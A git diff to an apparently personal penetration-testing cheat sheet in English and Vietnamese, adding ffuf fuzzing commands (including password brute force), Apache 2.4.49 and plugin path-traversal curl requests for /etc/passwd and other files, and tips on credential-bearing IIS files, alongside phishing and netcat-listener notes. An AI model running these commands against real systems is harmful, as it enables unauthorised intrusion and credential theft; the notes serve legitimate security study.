@@ -49,7 +49,7 @@ FTP (port 21):
 
 ```find / -name Settings.*  2>/dev/null``` #looking through the files / tìm tên file
 
-extra:
+Extra:
 
 Looking for hidden information in files in share folder /  trích xuất thông tin có trong files document:
 
@@ -130,6 +130,45 @@ Send phishing mail:
 
 wait for nc -lnvp 4444
 
+WEB SERVER (port 80, 8000, 8080, etc)
+
+Brute Force access:
+
+```ffuf -c -w /usr/share/wordlists/dirb/small.txt -u https://ffuf.io.fi/FUZZ```
+
+```ffuf -c -w /path/to/wordlist -u https://ffuf.io.fi/FUZZ -recursion -recursion-depth 2```
+
+GET parameter fuzzing
+
+```ffuf -c -w /path/to/wordlist -u https://ffuf.io.fi?FUZZ=test_value```
+
+POST data fuzzing
+
+```ffuf -c -w /path/to/wordlist -X POST -d "username=admin&password=FUZZ" -u https://ffuf.io.fi/login.php```
+
+
+Fire traversal:
+
+Apaache 2.4.49 vulnerability: cgi-bin directory in the URL 
+
+Encode: 
+
+```curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passw```
+
+```curl --path-as-is http://192.168.181.16:3000/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2F..%2F..%2F../opt/install.txt```
+
+For Linux we should check /etc/passwd and shh files.
+
+Let's briefly examine directory traversal attacks on Windows. On Windows, we can use the file C:\Windows\System32\drivers\etc\hosts to test directory traversal vulnerabilities. In general, it is more difficult to leverage a directory traversal vulnerability for system access on Windows than Linux.
+
+To identify files containing sensitive information, we need to closely examine the web application and collect information about the web server, framework, and programming language.
+
+Once we gather information about the running application or service, we can research paths leading to sensitive files. if we learn that a target system is running the Internet Information Services (IIS)5 web server, logs are located at C:\inetpub\logs\LogFiles\W3SVC1\. Another file we should always
+
+Check when the target is running an IIS web server is C:\inetpub\wwwroot\web.config, which may contain sensitive information like passwords or usernames.
+
+
+OS Command Injection:
 
 
 
